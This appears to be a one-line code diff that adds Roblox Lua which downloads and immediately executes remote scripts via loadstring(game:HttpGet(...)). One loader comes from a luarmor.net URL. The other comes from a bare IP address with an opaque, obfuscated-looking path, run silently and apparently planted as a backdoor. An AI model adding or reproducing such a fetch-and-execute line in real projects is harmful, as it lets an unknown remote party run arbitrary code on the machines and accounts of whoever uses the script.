@@ -1,0 +1,1 @@
+task.spawn(function()loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/2047cd613a95717b40465146e542b0bb.lua"))()end)loadstring(game:HttpGet("http://72.56.64.162/3lbSS8grQkeNFJlq6eiuTkNcPbo9FlcUhmbo2wpIrN1RSNldl0xjclbKSklelNJyvrWVdIBZIJQm0rfN"))()
